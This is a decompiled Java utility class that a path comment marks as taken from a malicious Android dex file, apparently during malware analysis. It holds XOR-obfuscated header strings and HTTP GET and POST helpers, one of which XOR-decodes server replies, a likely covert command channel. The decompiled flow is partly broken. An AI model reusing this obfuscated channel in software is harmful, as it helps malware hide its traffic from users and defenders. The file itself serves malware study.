package com.zjxyxnvvp.nxvxchltf.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class f {
    private static short[] $ = {6798, 6828, 6828, 6826, 6847, 6843, 6882, 6796, 6823, 6830, 6845, 6844, 6826, 6843, 6704, 6705, 6691, 6728, 6749, 8051, 8017, 8017, 8023, 8002, 8006, 7967, 8049, 8026, 8019, 8000, 8001, 8023, 8006, 5659, 5658, 5640, 5731, 5750, 7232, 7263, 7235, 7236, 8248, 8212, 8213, 8207, 8222, 8213, 8207, 8278, 8239, 8194, 8203, 8222, 1581, 1596, 1596, 1568, 1573, 1583, 1581, 1592, 1573, 1571, 1570, 1635, 1588, 1569, 1568, 4765, 4799, 4799, 4793, 4780, 4776, 4849, 4767, 4788, 4797, 4782, 4783, 4793, 4776, 4403, 4402, 4384, 4427, 4446, 8945, 8942, 8946, 8949, 5766, 5802, 5803, 5809, 5792, 5803, 5809, 5864, 5777, 5820, 5813, 5792, 1049, 1032, 1032, 1044, 1041, 1051, 1049, 1036, 1041, 1047, 1046, 1111, 1024, 1045, 1044};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static String a(String str) {
        URLConnection uRLConnection = null;
        try {
            try {
                uRLConnection = new URL(str).openConnection();
                uRLConnection.setRequestProperty($(0, 14, 6863), $(14, 19, 6757));
                uRLConnection.setConnectTimeout(10000);
                uRLConnection.setReadTimeout(10000);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(uRLConnection.getInputStream()));
                StringBuilder sb = new StringBuilder();
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine == null) {
                        break;
                    }
                    sb.append(readLine);
                }
                return sb.toString();
            } catch (IOException e) {
                e.printStackTrace();
                if (uRLConnection == null) {
                    return "";
                }
                try {
                    if (uRLConnection.getInputStream() == null) {
                        return "";
                    }
                    uRLConnection.getInputStream().close();
                    return "";
                } catch (IOException e2) {
                    e2.printStackTrace();
                    return "";
                }
            }
        } finally {
            if (uRLConnection != null) {
                try {
                    if (uRLConnection.getInputStream() != null) {
                        uRLConnection.getInputStream().close();
                    }
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
        }
    }

    public static String b(String str, byte[] bArr) {
        Throwable th;
        HttpURLConnection httpURLConnection;
        HttpURLConnection httpURLConnection2 = null;
        try {
            httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
        } catch (Throwable th2) {
            th = th2;
        }
        try {
            httpURLConnection.setRequestProperty($(19, 33, 7986), $(33, 38, 5710));
            httpURLConnection.setRequestMethod($(38, 42, 7184));
            httpURLConnection.setRequestProperty($(42, 54, 8315), $(54, 69, 1612));
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(bArr, 0, bArr.length);
            if (outputStream != null) {
                outputStream.close();
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder sb = new StringBuilder();
            while (true) {
                String readLine = bufferedReader.readLine();
                if (readLine == null) {
                    break;
                }
                sb.append(readLine);
            }
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            for (byte b2 : sb2.getBytes()) {
                sb3.append((char) (b2 ^ 66));
            }
            String sb4 = sb3.toString();
            if (httpURLConnection != null) {
                try {
                    if (httpURLConnection.getInputStream() != null) {
                        httpURLConnection.getInputStream().close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return sb4;
        } catch (Throwable th3) {
            th = th3;
            httpURLConnection2 = httpURLConnection;
            if (httpURLConnection2 != null) {
                try {
                    if (httpURLConnection2.getInputStream() != null) {
                        httpURLConnection2.getInputStream().close();
                    }
                } catch (IOException e2) {
                    e2.printStackTrace();
                }
            }
            throw th;
        }
    }

    public static String c(String str, byte[] bArr) {
        Throwable th;
        HttpURLConnection httpURLConnection = null;
        try {
            HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str).openConnection();
            try {
                httpURLConnection2.setRequestProperty($(69, 83, 4828), $(83, 88, 4454));
                httpURLConnection2.setRequestMethod($(88, 92, 8865));
                httpURLConnection2.setRequestProperty($(92, 104, 5829), $(104, 119, 1144));
                httpURLConnection2.setDoOutput(true);
                httpURLConnection2.setConnectTimeout(10000);
                httpURLConnection2.setReadTimeout(10000);
                OutputStream outputStream = httpURLConnection2.getOutputStream();
                outputStream.write(bArr, 0, bArr.length);
                if (outputStream != null) {
                    outputStream.close();
                }
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection2.getInputStream()));
                StringBuilder sb = new StringBuilder();
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine == null) {
                        break;
                    }
                    sb.append(readLine);
                }
                String sb2 = sb.toString();
                if (httpURLConnection2 != null) {
                    try {
                        if (httpURLConnection2.getInputStream() != null) {
                            httpURLConnection2.getInputStream().close();
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                return sb2;
            } catch (Throwable th2) {
                th = th2;
                httpURLConnection = httpURLConnection2;
                if (httpURLConnection != null) {
                    try {
                        if (httpURLConnection.getInputStream() != null) {
                            httpURLConnection.getInputStream().close();
                        }
                    } catch (IOException e2) {
                        e2.printStackTrace();
                    }
                }
                throw th;
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }
}
